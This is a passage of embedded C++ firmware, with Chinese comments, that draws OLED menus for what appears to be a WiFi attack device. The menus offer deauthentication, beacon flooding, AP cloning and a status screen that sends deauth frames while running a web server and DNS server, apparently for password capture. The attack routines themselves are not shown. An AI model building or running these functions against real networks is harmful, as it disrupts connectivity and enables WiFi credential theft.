      if (thumbH < 6) thumbH = 6;
      if (thumbH > trackH) thumbH = trackH;
      float posRatio = (float)webtest_password_scroll / (float)(totalItems - 1);
      int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
      // 拇指（填充条）
      display.fillRect(trackX, thumbY, scrollbarWidth, thumbH, SSD1306_WHITE);
    }
  }
  display.display();
}

void drawWebTestStatus() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  {
    const char* t = "↑ 返回 ↑";
    int w = u8g2_for_adafruit_gfx.getUTF8Width(t);
    int x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 12);
    u8g2_for_adafruit_gfx.print(t);
  }
  // bool apRunning = web_test_active; // unused
  String l2 = String("正在发送解除认证帧");
  {
    int w = u8g2_for_adafruit_gfx.getUTF8Width(l2.c_str());
    int x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 28);
    u8g2_for_adafruit_gfx.print(l2);
  }
  String l3 = String("Web服务: ") + (web_server_active ? "运行中" : "未运行");
  {
    int w = u8g2_for_adafruit_gfx.getUTF8Width(l3.c_str());
    int x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 44);
    u8g2_for_adafruit_gfx.print(l3);
  }
  String l4 = String("DNSServer: ") + (dns_server_active ? "运行中" : "未运行");
  {
    int w = u8g2_for_adafruit_gfx.getUTF8Width(l4.c_str());
    int x = (display.width() - w) / 2;
    u8g2_for_adafruit_gfx.setCursor(x, 60);
    u8g2_for_adafruit_gfx.print(l4);
  }
  display.display();
}

// 主页分页基础绘制（不带高亮）- 与攻击页风格一致
static int g_homeBaseStartIndex = 0;
void drawHomeMenuBasePaged(int startIndex) {
  display.clearDisplay();
  display.setTextSize(1);
  // 计算当前页实际显示的项目数量
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 12; // 调整文字垂直位置
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, textY);
    u8g2_for_adafruit_gfx.print(g_homeMenuItems[menuIndex].label);
    // 使用与攻击页完全一致的右箭头指示器
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
  // 绘制滚动条
  drawHomeScrollbar(startIndex);
  display.display();
}
// 无刷新版本：用于动画帧中避免双重刷新
void drawHomeMenuBasePaged_NoFlush(int startIndex) {
  display.clearDisplay();
  display.setTextSize(1);
  // 计算当前页实际显示的项目数量
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 13; // 下移2px：从+11改为+13
    
    // 裁剪标签
    String label = g_homeMenuItems[menuIndex].label;
    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
    if (labelWidth > maxTextWidth) {
      while (label.length() > 0 && 
             u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        label.remove(label.length() - 1);
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) {
          label.remove(label.length() - 1);
        }
      }
      label += "..";
    }
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, textY);
    u8g2_for_adafruit_gfx.print(label);
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
  // 绘制滚动条（无刷新版本）
  drawHomeScrollbar(startIndex);
}
void drawHomeMenuBasePagedShim() { drawHomeMenuBasePaged_NoFlush(g_homeBaseStartIndex); }

// ====== 通用菜单（可复用 WiFi 菜单样式与逻辑） ======

// 通用滚动条（指定总项数与页大小）
static inline void drawScrollbarGeneric(int totalCount, int pageSize, int startIndex) {
  if (totalCount <= pageSize) return;
  int barX = display.width() - UI_RIGHT_GUTTER + 1;
  int barWidth = UI_RIGHT_GUTTER - 2;
  int trackY = HOME_Y_OFFSET;
  int trackH = HOME_ITEM_HEIGHT * pageSize;
  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);
  float pageRatio = (float)pageSize / (float)totalCount;
  int computedThumb = (int)(trackH * pageRatio);
  int thumbH = (computedThumb < 6) ? 6 : computedThumb;
  float denom = (float)(totalCount - pageSize);
  float posRatio = denom > 0.0f ? ((float)startIndex / denom) : 0.0f;
  if (posRatio < 0.0f) posRatio = 0.0f;
  if (posRatio > 1.0f) posRatio = 1.0f;
  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
}
static inline void drawScrollbarFractionGeneric(int totalCount, int pageSize, float startIndexF) {
  if (totalCount <= pageSize) return;
  int barX = display.width() - UI_RIGHT_GUTTER + 1;
  int barWidth = UI_RIGHT_GUTTER - 2;
  int trackY = HOME_Y_OFFSET;
  int trackH = HOME_ITEM_HEIGHT * pageSize;
  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);
  float pageRatio = (float)pageSize / (float)totalCount;
  int computedThumb = (int)(trackH * pageRatio);
  int thumbH = (computedThumb < 6) ? 6 : computedThumb;
  float denom = (float)(totalCount - pageSize);
  float posRatio = denom > 0.0f ? (startIndexF / denom) : 0.0f;
  if (posRatio < 0.0f) posRatio = 0.0f;
  if (posRatio > 1.0f) posRatio = 1.0f;
  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
}

// 始终绘制滚动条（占位用）：即便一页可展示全部，也显示轨道与最小拇指
static inline void drawScrollbarGenericAlways(int totalCount, int pageSize, int startIndex) {
  int barX = display.width() - UI_RIGHT_GUTTER + 1;
  int barWidth = UI_RIGHT_GUTTER - 2;
  int trackY = HOME_Y_OFFSET;
  int trackH = HOME_ITEM_HEIGHT * pageSize;
  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);

  int thumbH;
  int thumbY;
  if (totalCount <= pageSize) {
    // 不需要分页时，绘制居中的竖线占位，左右与轨道留出间距
    int lineHMargin = 3; // 顶部和底部间距
    thumbH = trackH - lineHMargin * 2;
    if (thumbH < 6) thumbH = 6;
    thumbY = trackY + (trackH - thumbH) / 2;

    int minLineWidth = 2;
    int maxLineWidth = 3;
    int lineW = barWidth / 4; // 基于轨道宽度估算合适粗细
    if (lineW < minLineWidth) lineW = minLineWidth;
    if (lineW > maxLineWidth) lineW = maxLineWidth;
    int sideMargin = (barWidth - lineW) / 2; // 与轨道左右留白
    // 稍微向左偏移1px，让其位于轨道内部的中间偏左
    int lineX = barX + 1 + sideMargin - 1;
    if (lineX < barX + 1) lineX = barX + 1; // 保证不贴边
    display.fillRect(lineX, thumbY, lineW, thumbH, SSD1306_WHITE);
    return;
  } else {
    float pageRatio = (float)pageSize / (float)totalCount;
    int computedThumb = (int)(trackH * pageRatio);
    thumbH = (computedThumb < 6) ? 6 : computedThumb;
    float denom = (float)(totalCount - pageSize);
    float posRatio = denom > 0.0f ? ((float)startIndex / denom) : 0.0f;
    if (posRatio < 0.0f) posRatio = 0.0f;
    if (posRatio > 1.0f) posRatio = 1.0f;
    thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
  }
  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
}


// 通用基础页绘制（不刷新）：复用WiFi菜单样式
static void drawMenuBasePaged_NoFlush_Generic(const HomeMenuItem* items, int itemCount, int startIndex) {
  display.clearDisplay();
  display.setTextSize(1);
  int visible = (HOME_PAGE_SIZE < (itemCount - startIndex)) ? HOME_PAGE_SIZE : (itemCount - startIndex);
  for (int i = 0; i < visible; i++) {
    int idx = startIndex + i;
    if (idx >= itemCount) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 13;
    String label = items[idx].label;
    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
    if (labelWidth > maxTextWidth) {
      while (label.length() > 0 && u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        label.remove(label.length() - 1);
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) { label.remove(label.length() - 1); }
      }
      label += "..";
    }
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, textY);
    u8g2_for_adafruit_gfx.print(label);
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
  if (g_forceScrollbarAlwaysForGeneric) {
    drawScrollbarGenericAlways(itemCount, HOME_PAGE_SIZE, startIndex);
  } else {
    drawScrollbarGeneric(itemCount, HOME_PAGE_SIZE, startIndex);
  }
}

// 通用页绘制（带y偏移、不刷新）：用于翻页动画
static inline void drawMenuPageWithOffset_NoFlush_Generic(const HomeMenuItem* items, int itemCount, int startIndex, int yOffset) {
  display.setTextSize(1);
  int visible = (HOME_PAGE_SIZE < (itemCount - startIndex)) ? HOME_PAGE_SIZE : (itemCount - startIndex);
  for (int i = 0; i < visible; i++) {
    int idx = startIndex + i;
    if (idx >= itemCount) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT + yOffset;
    int textY = rectY + 13;
    if (rectY > display.height() || rectY + HOME_RECT_HEIGHT < 0) continue;
    String label = items[idx].label;
    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
    if (labelWidth > maxTextWidth) {
      while (label.length() > 0 && u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        label.remove(label.length() - 1);
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) { label.remove(label.length() - 1); }
      }
      label += "..";
    }
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, textY);
    u8g2_for_adafruit_gfx.print(label);
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
}

// 通用翻页动画
static inline void animateMenuPageFlip_Generic(const HomeMenuItem* items, int itemCount, int fromStartIndex, int toStartIndex) {
  if (fromStartIndex == toStartIndex) return;
  int delta = toStartIndex - fromStartIndex;
  if (delta != 1 && delta != -1) {
    drawMenuBasePaged_NoFlush_Generic(items, itemCount, fromStartIndex);
    display.display();
    return;
  }
  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
  unsigned long nextStepDeadline = millis() + delayPerStepMs;
  for (int s = 1; s <= ANIM_STEPS; s++) {
    int offset = (HOME_ITEM_HEIGHT * s) / ANIM_STEPS; // 0..H
    int dir = (delta > 0) ? 1 : -1; // +1: 内容上移；-1: 内容下移
    int fromYOffset = (dir > 0) ? -offset : offset;
    int toYOffset = (dir > 0) ? (HOME_ITEM_HEIGHT - offset) : -(HOME_ITEM_HEIGHT - offset);
    display.clearDisplay();
    if (dir > 0) {
      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, toStartIndex, toYOffset);
      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, fromStartIndex, fromYOffset);
    } else {
      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, fromStartIndex, fromYOffset);
      drawMenuPageWithOffset_NoFlush_Generic(items, itemCount, toStartIndex, toYOffset);
    }
    float progress = (float)offset / (float)HOME_ITEM_HEIGHT;
    float startIndexF = (float)fromStartIndex + progress * (float)delta;
    drawScrollbarFractionGeneric(itemCount, HOME_PAGE_SIZE, startIndexF);
    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) display.display();
    if (delayPerStepMs > 0) {
      while ((long)(millis() - nextStepDeadline) < 0) { }
      nextStepDeadline += delayPerStepMs;
    }
  }
}

// 选择动画（通用）：使用通用基础绘制shim
static const HomeMenuItem* g_genericMenuItems = nullptr;
static int g_genericMenuCount = 0;
static int g_genericBaseStartIndex = 0;
static void drawGenericMenuBaseShim() { drawMenuBasePaged_NoFlush_Generic(g_genericMenuItems, g_genericMenuCount, g_genericBaseStartIndex); }
// 前置声明：选择动画（在下方定义）
static inline void animateSelectionGeneric(int yFrom, int yTo, int rectHeight, int cornerRadius, bool useFullWidth, bool doubleOutline, void (*drawBaseNoFlush)());
static inline void animateMoveGenericMenu(int yFrom, int yTo, int rectHeight, int startIndex) {
  g_genericBaseStartIndex = startIndex;
  bool prev = g_forceScrollbarAlwaysForGeneric;
  // 在BLE上下文中调用该动画时，外部会先设置 g_genericMenuItems/genericMenuCount
  // 在动画期间强制显示占位滚动条，降低闪烁
  g_forceScrollbarAlwaysForGeneric = (g_genericMenuItems == g_bleMenuItems);
  animateSelectionGeneric(yFrom, yTo, rectHeight, 4, /*useFullWidth=*/false, /*doubleOutline=*/false, drawGenericMenuBaseShim);
  g_forceScrollbarAlwaysForGeneric = prev;
}

// 内部辅助：绘制某页并整体添加y偏移（不刷新）。偏移允许为负/正，用于翻页过渡。
static inline void drawHomePageWithOffset_NoFlush(int startIndex, int yOffset) {
  display.setTextSize(1);
  // 计算当前页实际显示的项目数量
  int currentPageItems = (HOME_PAGE_SIZE < (HOME_MAX_ITEMS - startIndex)) ? HOME_PAGE_SIZE : (HOME_MAX_ITEMS - startIndex);
  for (int i = 0; i < currentPageItems; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= HOME_MAX_ITEMS) break;
    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT + yOffset;
    int textY = rectY + 13; // 下移2px：从+11改为+13
    // 仅绘制可见区域，避免越界绘制
    if (rectY > display.height() || rectY + HOME_RECT_HEIGHT < 0) continue;
    
    // 裁剪标签
    String label = g_homeMenuItems[menuIndex].label;
    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
    if (labelWidth > maxTextWidth) {
      while (label.length() > 0 && 
             u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
        label.remove(label.length() - 1);
        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) {
          label.remove(label.length() - 1);
        }
      }
      label += "..";
    }
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, textY);
    u8g2_for_adafruit_gfx.print(label);
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
}

// 首页翻页平滑动画：在fromStartIndex与toStartIndex（相差1）之间平移列表与滚动条
static inline void animateHomePageFlip(int fromStartIndex, int toStartIndex) {
  if (fromStartIndex == toStartIndex) return;
  int delta = toStartIndex - fromStartIndex;
  if (delta != 1 && delta != -1) {
    // 仅支持逐项翻页
    drawHomeMenuBasePaged(fromStartIndex);
    return;
  }
  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
  unsigned long nextStepDeadline = millis() + delayPerStepMs;
  for (int s = 1; s <= ANIM_STEPS; s++) {
    int offset = (HOME_ITEM_HEIGHT * s) / ANIM_STEPS; // 0..H
    int dir = (delta > 0) ? 1 : -1; // +1: 内容上移；-1: 内容下移
    int fromYOffset = (dir > 0) ? -offset : offset;
    int toYOffset = (dir > 0) ? (HOME_ITEM_HEIGHT - offset) : -(HOME_ITEM_HEIGHT - offset);

    display.clearDisplay();
    // 先画在底层的那一页（避免覆盖顺序问题）
    if (dir > 0) {
      // 向上滚动：先画新页，再画旧页
      drawHomePageWithOffset_NoFlush(toStartIndex, toYOffset);
      drawHomePageWithOffset_NoFlush(fromStartIndex, fromYOffset);
    } else {
      // 向下滚动：先画旧页，再画新页
      drawHomePageWithOffset_NoFlush(fromStartIndex, fromYOffset);
      drawHomePageWithOffset_NoFlush(toStartIndex, toYOffset);
    }

    // 滚动条按进度插值
    float progress = (float)offset / (float)HOME_ITEM_HEIGHT; // 0..1
    float startIndexF = (float)fromStartIndex + progress * (float)delta;
    drawHomeScrollbarFraction(startIndexF);

    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) {
      display.display();
    }
    if (delayPerStepMs > 0) {
      while ((long)(millis() - nextStepDeadline) < 0) {
        // 可在此处理输入
      }
      nextStepDeadline += delayPerStepMs;
    }
  }
}

// ===== Generic animation + shims to reduce duplication =====
static int g_deauthBaseStartIndex = 0;
static int g_ssidBaseStartIndex = 0;

void drawDeauthMenuBaseShim() { drawDeauthMenuBase_NoFlush(g_deauthBaseStartIndex); }
void drawSsidPageBaseShim() { drawSsidPageBase_NoFlush(g_ssidBaseStartIndex); }

static inline void animateSelectionGeneric(
  int yFrom,
  int yTo,
  int rectHeight,
  int cornerRadius,
  bool useFullWidth,
  bool doubleOutline,
  void (*drawBaseNoFlush)()
) {
  const int delayPerStepMs = SELECT_MOVE_TOTAL_MS / ANIM_STEPS;
  const int width = useFullWidth ? display.width() : (display.width() - UI_RIGHT_GUTTER);
  unsigned long startMs = millis();
  unsigned long nextStepDeadline = startMs + delayPerStepMs;
  for (int s = 1; s <= ANIM_STEPS; s++) {
    int y = yFrom + ((yTo - yFrom) * s) / ANIM_STEPS;
    drawBaseNoFlush();
    display.drawRoundRect(0, y, width, rectHeight, cornerRadius, SSD1306_WHITE);
    if (doubleOutline) {
      display.drawRoundRect(1, y + 1, width - 2, rectHeight - 2, cornerRadius, SSD1306_WHITE);
    }
    if ((s % DISPLAY_FLUSH_EVERY_FRAMES) == 0 || s == ANIM_STEPS) {
      display.display();
    }
    // 非阻塞等待到下一帧时间点
    if (delayPerStepMs > 0) {
      while ((long)(millis() - nextStepDeadline) < 0) {
        // 可在这里处理输入/后台任务（当前留空以避免重入）
        // yield();
      }
      nextStepDeadline += delayPerStepMs;
    }
  }
}

// 基础绘制：攻击菜单（不带高亮）
void drawAttackMenuBase() {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {
    "解除身份认证攻击",
    "发送信标帧攻击",
    "信标帧+解除认证",
    "《 返回 》"
  };
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
  }
}

// 无刷新版本：用于动画帧
void drawAttackMenuBase_NoFlush() {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {
    "解除身份认证攻击",
    "发送信标帧攻击",
    "信标帧+解除认证",
    "《 返回 》"
  };
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
  }
}
// 基础绘制：信标菜单（不带高亮）
void drawBeaconMenuBase() {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {"随机信标攻击", "克隆已选AP(暴力)", "克隆已选AP(稳定)", "《 返回 》"};
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
  }
  display.display();
}

// 无刷新版本：用于动画帧
void drawBeaconMenuBase_NoFlush() {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {"随机信标攻击", "克隆已选AP(暴力)", "克隆已选AP(稳定)", "《 返回 》"};
  for (int i = 0; i < 4; i++) {
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[i]);
    drawRightChevron(yPos-2, 14, false);
  }
}
// 基础绘制：解除认证菜单（不带高亮）
void drawDeauthMenuBase(int startIndex) {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {
    "稳定自动多重攻击",
    "自动多重攻击",
    "自动单一攻击",
    "全网攻击",
    "单一攻击",
    "多重攻击",
    "《 返回 》"
  };
  for (int i = 0; i < 4; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= 6) break;
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
    drawRightChevron(yPos-2, 14, false);
  }
  display.display();
}
// 无刷新版本：用于动画帧
void drawDeauthMenuBase_NoFlush(int startIndex) {
  display.clearDisplay();
  display.setTextSize(1);
  const char* menuItems[] = {
    "稳定自动多重攻击",
    "自动多重攻击",
    "自动单一攻击",
    "全网攻击",
    "单一攻击",
    "多重攻击",
    "《 返回 》"
  };
  for (int i = 0; i < 4; i++) {
    int menuIndex = startIndex + i;
    if (menuIndex >= 6) break;
    int yPos = 2 + i * 16;
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
    u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
    drawRightChevron(yPos-2, 14, false);
  }
}

// 将SSID中无法显示的字符替换为"[?]"，保留ASCII与常用中文（CJK统一表意文字）
String sanitizeForDisplay(const String& input) {
  String output;
  for (size_t i = 0; i < (size_t)input.length(); ) {
    unsigned char b0 = (unsigned char)input[i];
    // 单字节ASCII
    if (b0 < 0x80) {
      if (b0 >= 32 && b0 != 127) {
        output += (char)b0;
      } else {
        output += "[?]";
      }
      i += 1;
      continue;
    }
    // 多字节UTF-8
    int seqLen = 0;
    if ((b0 & 0xE0) == 0xC0) seqLen = 2;         // 110xxxxx
    else if ((b0 & 0xF0) == 0xE0) seqLen = 3;    // 1110xxxx
    else if ((b0 & 0xF8) == 0xF0) seqLen = 4;    // 11110xxx
    else { output += "[?]"; i += 1; continue; }

    // 检查剩余长度
    if (i + (size_t)seqLen > (size_t)input.length()) { output += "[?]"; break; }
    // 验证续字节
    bool valid = true;
    for (int k = 1; k < seqLen; ++k) {
      unsigned char bk = (unsigned char)input[i + k];
      if ((bk & 0xC0) != 0x80) { valid = false; break; }
    }
    if (!valid) { output += "[?]"; i += 1; continue; }

    if (seqLen == 3) {
      // 解码三字节
      unsigned char b1 = (unsigned char)input[i + 1];
      unsigned char b2 = (unsigned char)input[i + 2];
      uint16_t codepoint = ((b0 & 0x0F) << 12) | ((b1 & 0x3F) << 6) | (b2 & 0x3F);
      // 保留范围：
      // - CJK统一表意文字 U+4E00..U+9FFF（常见中文）
      // - CJK 符号与标点 U+3000..U+303F（中文标点：、。「」《》…等）
      // - 全角形式 U+FF00..U+FFEF（全角标点、数字与符号）
      // - 一般标点 U+2000..U+206F（— – “ ” ‘ ’ … 等）
      if ((codepoint >= 0x4E00 && codepoint <= 0x9FFF) ||
          (codepoint >= 0x3000 && codepoint <= 0x303F) ||
          (codepoint >= 0xFF00 && codepoint <= 0xFFEF) ||
          (codepoint >= 0x2000 && codepoint <= 0x206F)) {
        output += input.substring(i, i + 3);
      } else {
        output += "[?]";
      }
      i += 3;
    } else if (seqLen == 2) {
      // 2字节字符通常未提供字体，统一替换
      output += "[?]";
      i += 2;
    } else { // seqLen == 4 (例如emoji)
      output += "[?]";
      i += 4;
    }
  }
  return output;
}

// 基础绘制：SSID选择页面（不带高亮）
void drawSsidPageBase(int startIndex) {
  const int MAX_DISPLAY_ITEMS = 4;
  const int ITEM_HEIGHT = 14;
  const int Y_OFFSET = 2;
  const int TEXT_LEFT = 6;
  const int BASELINE_ASCII_OFFSET = 4;
  const int BASELINE_CHINESE_OFFSET = 10;
  const int SSID_RIGHT_LIMIT_X = 110;
  const int STAR_GAP = 20;

  bool allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
  display.clearDisplay();
  display.setTextSize(1);
  for (int i = 0; i < MAX_DISPLAY_ITEMS && i <= (int)scan_results.size(); i++) {
    int displayIndex = startIndex + i;
    if (displayIndex > (int)scan_results.size()) break;
    if (displayIndex == 0) {
      int yPos = i * ITEM_HEIGHT + Y_OFFSET;
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      const char* label = allSelected ? "> 取消全选 <" : "> 全选 <";
      int w = u8g2_for_adafruit_gfx.getUTF8Width(label);
      int x = (display.width() - w) / 2;
      u8g2_for_adafruit_gfx.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
      u8g2_for_adafruit_gfx.print(label);
      continue;
    }
    int wifiIndex = displayIndex - 1;
    String ssid = sanitizeForDisplay(scan_results[wifiIndex].ssid);
    if (ssid.length() == 0) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
        scan_results[wifiIndex].bssid[0],
        scan_results[wifiIndex].bssid[1],
        scan_results[wifiIndex].bssid[2],
        scan_results[wifiIndex].bssid[3],
        scan_results[wifiIndex].bssid[4],
        scan_results[wifiIndex].bssid[5]);
      ssid = String(mac);
    }
    bool isSelected = isIndexSelected(wifiIndex);
    bool showIndicator = isSelected;
    if (showIndicator) {
      display.setCursor(3, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      display.setTextColor(SSD1306_WHITE);
      display.print("[*]");
    }
    int textX = TEXT_LEFT + (isSelected ? STAR_GAP : 0);
    String clipped = utf8TruncateToWidth(ssid, SSID_RIGHT_LIMIT_X - textX);
    if (containsChinese(ssid)) {
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      int textY = i * ITEM_HEIGHT + BASELINE_CHINESE_OFFSET + Y_OFFSET;
      u8g2_for_adafruit_gfx.setCursor(textX, textY);
      u8g2_for_adafruit_gfx.print(clipped);
    } else {
      display.setCursor(textX, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      display.setTextColor(SSD1306_WHITE);
      display.print(clipped);
    }
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(110, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
    display.print(scan_results[wifiIndex].channel >= 36 ? "5G" : "24");
  }
  display.display();
}
// 无刷新版本：用于动画帧
void drawSsidPageBase_NoFlush(int startIndex) {
  const int MAX_DISPLAY_ITEMS = 4;
  const int ITEM_HEIGHT = 14;
  const int Y_OFFSET = 2;
  const int TEXT_LEFT = 6;
  const int BASELINE_ASCII_OFFSET = 4;
  const int BASELINE_CHINESE_OFFSET = 10;
  const int SSID_RIGHT_LIMIT_X = 110;
  const int STAR_GAP = 20;

  bool allSelected = (SelectedVector.size() == scan_results.size() && !scan_results.empty());
  display.clearDisplay();
  display.setTextSize(1);
  for (int i = 0; i < MAX_DISPLAY_ITEMS && i <= (int)scan_results.size(); i++) {
    int displayIndex = startIndex + i;
    if (displayIndex > (int)scan_results.size()) break;
    if (displayIndex == 0) {
      int yPos = i * ITEM_HEIGHT + Y_OFFSET;
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      const char* label = allSelected ? "> 取消全选 <" : "> 全选 <";
      int w = u8g2_for_adafruit_gfx.getUTF8Width(label);
      int x = (display.width() - w) / 2;
      u8g2_for_adafruit_gfx.setCursor(x, yPos + BASELINE_CHINESE_OFFSET);
      u8g2_for_adafruit_gfx.print(label);
      continue;
    }
    int wifiIndex = displayIndex - 1;
    String ssid = sanitizeForDisplay(scan_results[wifiIndex].ssid);
    if (ssid.length() == 0) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
        scan_results[wifiIndex].bssid[0],
        scan_results[wifiIndex].bssid[1],
        scan_results[wifiIndex].bssid[2],
        scan_results[wifiIndex].bssid[3],
        scan_results[wifiIndex].bssid[4],
        scan_results[wifiIndex].bssid[5]);
      ssid = String(mac);
    }
    bool isSelected = isIndexSelected(wifiIndex);
    bool showIndicator = isSelected;
    if (showIndicator) {
